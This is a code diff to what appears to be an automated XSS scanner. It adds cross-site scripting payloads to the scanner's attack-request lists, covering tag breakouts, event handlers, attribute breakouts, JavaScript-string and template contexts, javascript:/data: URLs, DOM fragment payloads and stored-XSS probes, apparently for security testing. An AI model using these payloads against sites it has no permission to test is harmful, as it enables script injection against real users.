@@ -86,6 +86,8 @@ def _xss_script_requests() -> list[AttackRequest]:
         "<script>alert('{token}')</script>",
         '<script>alert("{token}")</script>',
         "</textarea><script>alert('{token}')</script>",
+        "</title><script>alert('{token}')</script>",
+        "</style><script>alert('{token}')</script>",
         "</script><script>alert('{token}')</script>",
     ]
     return _numbered_requests("XSS_script", payloads)
@@ -98,6 +100,8 @@ def _xss_event_handler_requests() -> list[AttackRequest]:
         "<svg onload=alert('{token}')>",
         "<body onload=alert('{token}')>",
         "<details open ontoggle=alert('{token}')>",
+        "<input autofocus onfocus=alert('{token}')>",
+        "<xss style=animation-name:ibds onanimationstart=alert('{token}')>",
     ]
     return _numbered_requests("XSS_event_handler", payloads)
 
@@ -107,10 +111,23 @@ def _xss_attribute_breakout_requests() -> list[AttackRequest]:
     payloads = [
         '" onmouseover=alert(\'{token}\') x="',
         "' onmouseover=alert(\"{token}\") x='",
+        '" autofocus onfocus=alert(\'{token}\') x="',
+        "' autofocus onfocus=alert(\"{token}\") x='",
         '"><img src=x onerror=alert(\'{token}\')>',
         "'><svg onload=alert(\"{token}\")>",
     ]
     return _numbered_requests("XSS_attribute_breakout", payloads)
+
+
+def _xss_javascript_context_requests() -> list[AttackRequest]:
+
+    payloads = [
+        "';alert('{token}');//",
+        '";alert("{token}");//',
+        "`;alert('{token}');//",
+        "${alert('{token}')}",
+    ]
+    return _numbered_requests("XSS_javascript_context", payloads)
 
 
 def _xss_url_context_requests() -> list[AttackRequest]:
@@ -118,16 +135,39 @@ def _xss_url_context_requests() -> list[AttackRequest]:
     payloads = [
         "javascript:alert('{token}')",
         "JaVaScRiPt:alert('{token}')",
+        "javascript:confirm('{token}')",
         "data:text/html,<script>alert('{token}')</script>",
+        "data:text/html,<svg onload=alert('{token}')>",
     ]
     return _numbered_requests("XSS_url_context", payloads)
 
 
-def _xss_escape_probe_requests() -> list[AttackRequest]:
-
+def _xss_dom_context_requests() -> list[AttackRequest]:
 
     payloads = [
-        'IBDS_XSS_ESC_{token}<>"\'&',
+        "#<script>alert('{token}')</script>",
+        "#\"><img src=x onerror=alert('{token}')>",
+        "#'><svg onload=alert(\"{token}\")>",
+        "#</script><script>alert('{token}')</script>",
+    ]
+    return _numbered_requests("XSS_dom_context", payloads)
+
+
+def _xss_stored_context_requests() -> list[AttackRequest]:
+
+    payloads = [
+        '<script>document.body.setAttribute("data-ibds-xss","{token}")</script>',
+        '<img src=x onerror="document.body.setAttribute(\'data-ibds-xss\',\'{token}\')">',
+        '<svg onload="document.body.setAttribute(\'data-ibds-xss\',\'{token}\')">',
+        '<iframe srcdoc="<script>alert(\'{token}\')</script>"></iframe>',
+    ]
+    return _numbered_requests("XSS_stored_context", payloads)
+
+
+def _xss_escape_probe_requests() -> list[AttackRequest]:
+
+    payloads = [
+        "IBDS_XSS_ESC_{token}<>\"'&",
     ]
     return _numbered_requests("XSS_escape_probe", payloads)
 
@@ -168,7 +208,10 @@ def build_attack_request_list(
         requests.extend(_xss_script_requests())
         requests.extend(_xss_event_handler_requests())
         requests.extend(_xss_attribute_breakout_requests())
+        requests.extend(_xss_javascript_context_requests())
         requests.extend(_xss_url_context_requests())
+        requests.extend(_xss_dom_context_requests())
+        requests.extend(_xss_stored_context_requests())
         requests.extend(_xss_escape_probe_requests())
 
     return requests
